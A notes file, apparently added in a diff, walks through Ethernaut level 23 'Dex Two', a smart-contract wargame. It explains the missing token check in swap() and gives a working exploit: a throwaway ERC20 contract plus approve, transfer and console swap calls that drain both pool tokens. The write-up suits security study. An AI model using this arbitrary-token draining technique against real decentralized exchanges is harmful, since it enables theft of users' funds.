@@ -1,0 +1,68 @@
+------------------
+NOTES
+------------------
+
+LEVEL 23: Dex Two
+
+Vulnerability - Unauthenticated ERC20 Token
+- Dex two creates an example dex (decentralized exchange) where the purpose is
+	to trade token1 and token2
+- However, the difference from the original dex level is there is no
+	validation that the contract will be trading token1 and token2
+- This allows for an attacker to add an arbitrary token to the dex with a
+	theoretically unlimited supply
+- With this unlimited supply an attacker can trade the new token for any
+	token1/ token2, draining the supply
+
+- In the code
+
+	From Dex (level 22):
+	 function swap(address from, address to, uint amount) public {
+    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+		 require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+
+	From Dex Two (this level):
+		 function swap(address from, address to, uint amount) public {
+    	require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+
+		- The first require statement in the snippet from Dex, requires that
+			token1 and token2 are the only tokens that can be swapped
+
+Exploitation
+- Full code can be found in "contracts/23_dex_two.sol"
+- Creating a new ERC20 token
+	- Using the blueprints from the OpenZeppelin contract, declare the token
+
+		import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol';
+
+		contract attackerTwo is ERC20 {
+
+  		constructor (uint amount) ERC20("<coin name>", "<coin ticker>"){
+    	_mint(msg.sender, amount);
+  		}
+		}
+
+	- Deploy the contract to the blockchain via Remix with a starting amount of
+		1000
+		- Note: Remember to select "Injected Provider" as the network
+
+- Approving transfer of the new token
+	- Approve the ethernaut contract to swap amount of the coin
+	- From Remix, when the contract is deployed, use the approve() function of
+		the ERC20 contract to approve the ethernaut contract
+
+			'<ethernaut contract address>', 1000
+
+- Executing malicious trades
+	- From Remix, transfer 1 of the ERC20 tokens to the ethernaut contract
+		- Use the transfer function with the following data:
+
+			'<ethernaut contract address>', 1
+
+	- From the browser console, swap token1 and token2 for the ERC20 token
+
+		attacker = '<address of new token contract>'
+		await contract.swap(attacker, contract.token1, 1)
+		await contract.swap(attacker, contract.token2, 2)
+
+- Submit the instance
